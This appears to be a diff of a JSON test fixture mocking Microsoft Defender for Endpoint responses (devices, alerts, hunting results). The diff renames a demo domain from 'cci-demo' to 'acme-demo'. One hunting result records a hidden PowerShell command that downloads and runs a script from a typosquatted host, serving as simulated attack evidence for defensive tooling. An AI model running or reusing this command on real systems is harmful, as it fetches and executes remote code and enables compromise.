@@ -7,7 +7,7 @@
     "value": [
      {
       "id": "mde-jane01",
-      "computerDnsName": "jane-lt01.cci-demo.com",
+      "computerDnsName": "jane-lt01.acme-demo.com",
       "aadDeviceId": "aad-jane01",
       "lastIpAddress": "10.20.1.15",
       "osPlatform": "Windows",
@@ -25,7 +25,7 @@
    },
    "status": 200,
    "params": {
-    "$filter": "computerDnsName eq 'jane-lt01.cci-demo.com'"
+    "$filter": "computerDnsName eq 'jane-lt01.acme-demo.com'"
    }
   },
   {
@@ -35,7 +35,7 @@
     "value": [
      {
       "id": "mde-jane01",
-      "computerDnsName": "jane-lt01.cci-demo.com",
+      "computerDnsName": "jane-lt01.acme-demo.com",
       "aadDeviceId": "aad-jane01",
       "lastIpAddress": "10.20.1.15",
       "osPlatform": "Windows",
@@ -63,7 +63,7 @@
     "value": [
      {
       "id": "mde-bob02",
-      "computerDnsName": "bob-lt02.cci-demo.com",
+      "computerDnsName": "bob-lt02.acme-demo.com",
       "aadDeviceId": "aad-bob02",
       "lastIpAddress": "10.20.1.22",
       "osPlatform": "Windows",
@@ -89,7 +89,7 @@
     "value": [
      {
       "id": "mde-web01",
-      "computerDnsName": "web01.cci-demo.com",
+      "computerDnsName": "web01.acme-demo.com",
       "aadDeviceId": null,
       "lastIpAddress": "10.10.0.5",
       "osPlatform": "Linux",
@@ -115,7 +115,7 @@
     "value": [
      {
       "id": "mde-db01",
-      "computerDnsName": "db01.cci-demo.com",
+      "computerDnsName": "db01.acme-demo.com",
       "aadDeviceId": null,
       "lastIpAddress": "10.10.0.6",
       "osPlatform": "Windows",
@@ -152,7 +152,7 @@
     "value": [
      {
       "id": "mde-jane01",
-      "computerDnsName": "jane-lt01.cci-demo.com",
+      "computerDnsName": "jane-lt01.acme-demo.com",
       "aadDeviceId": "aad-jane01",
       "lastIpAddress": "10.20.1.15",
       "osPlatform": "Windows",
@@ -168,7 +168,7 @@
      },
      {
       "id": "mde-bob02",
-      "computerDnsName": "bob-lt02.cci-demo.com",
+      "computerDnsName": "bob-lt02.acme-demo.com",
       "aadDeviceId": "aad-bob02",
       "lastIpAddress": "10.20.1.22",
       "osPlatform": "Windows",
@@ -182,7 +182,7 @@
      },
      {
       "id": "mde-web01",
-      "computerDnsName": "web01.cci-demo.com",
+      "computerDnsName": "web01.acme-demo.com",
       "aadDeviceId": null,
       "lastIpAddress": "10.10.0.5",
       "osPlatform": "Linux",
@@ -196,7 +196,7 @@
      },
      {
       "id": "mde-db01",
-      "computerDnsName": "db01.cci-demo.com",
+      "computerDnsName": "db01.acme-demo.com",
       "aadDeviceId": null,
       "lastIpAddress": "10.10.0.6",
       "osPlatform": "Windows",
@@ -210,7 +210,7 @@
      },
      {
       "id": "mde-fs01",
-      "computerDnsName": "fs01.cci-demo.com",
+      "computerDnsName": "fs01.acme-demo.com",
       "aadDeviceId": null,
       "lastIpAddress": "10.10.0.20",
       "osPlatform": "Windows",
@@ -238,7 +238,7 @@
       "category": "Execution",
       "status": "New",
       "machineId": "mde-jane01",
-      "computerDnsName": "jane-lt01.cci-demo.com",
+      "computerDnsName": "jane-lt01.acme-demo.com",
       "alertCreationTime": "2026-09-20T09:09:30Z",
       "mitreTechniques": [
        "T1059.001",
@@ -248,7 +248,7 @@
       "incidentId": 4401,
       "relatedUser": {
        "userName": "jane.doe",
-       "domainName": "CCI"
+       "domainName": "ACME"
       },
       "evidence": [
        {
@@ -278,7 +278,7 @@
       "category": "InitialAccess",
       "status": "New",
       "machineId": "mde-db01",
-      "computerDnsName": "db01.cci-demo.com",
+      "computerDnsName": "db01.acme-demo.com",
       "alertCreationTime": "2026-09-20T05:12:00Z",
       "mitreTechniques": [
        "T1190"
@@ -305,7 +305,7 @@
     "value": [
      {
       "id": "mde-jane01",
-      "computerDnsName": "jane-lt01.cci-demo.com",
+      "computerDnsName": "jane-lt01.acme-demo.com",
       "aadDeviceId": "aad-jane01",
       "lastIpAddress": "10.20.1.15",
       "osPlatform": "Windows",
@@ -347,7 +347,7 @@
       "category": "Execution",
       "status": "New",
       "machineId": "mde-jane01",
-      "computerDnsName": "jane-lt01.cci-demo.com",
+      "computerDnsName": "jane-lt01.acme-demo.com",
       "alertCreationTime": "2026-09-20T09:09:30Z",
       "mitreTechniques": [
        "T1059.001",
@@ -357,7 +357,7 @@
       "incidentId": 4401,
       "relatedUser": {
        "userName": "jane.doe",
-       "domainName": "CCI"
+       "domainName": "ACME"
       },
       "evidence": [
        {
@@ -378,7 +378,7 @@
       "category": "InitialAccess",
       "status": "New",
       "machineId": "mde-db01",
-      "computerDnsName": "db01.cci-demo.com",
+      "computerDnsName": "db01.acme-demo.com",
       "alertCreationTime": "2026-09-20T05:12:00Z",
       "mitreTechniques": [
        "T1190"
@@ -488,7 +488,7 @@
     "value": [
      {
       "id": "mde-jane01",
-      "computerDnsName": "jane-lt01.cci-demo.com",
+      "computerDnsName": "jane-lt01.acme-demo.com",
       "aadDeviceId": "aad-jane01",
       "lastIpAddress": "10.20.1.15",
       "osPlatform": "Windows",
@@ -521,7 +521,7 @@
     "Results": [
      {
       "Timestamp": "2026-09-20T09:07:41Z",
-      "DeviceName": "jane-lt01.cci-demo.com",
+      "DeviceName": "jane-lt01.acme-demo.com",
       "ActionType": "ProcessCreated",
       "FileName": "powershell.exe",
       "ProcessCommandLine": "powershell.exe -nop -w hidden -c iex(iwr https://login.micros0ft-helpdesk.com/p.ps1)",
@@ -529,7 +529,7 @@
      },
      {
       "Timestamp": "2026-09-20T09:07:44Z",
-      "DeviceName": "jane-lt01.cci-demo.com",
+      "DeviceName": "jane-lt01.acme-demo.com",
       "ActionType": "ConnectionSuccess",
       "RemoteUrl": "login.micros0ft-helpdesk.com"
      }
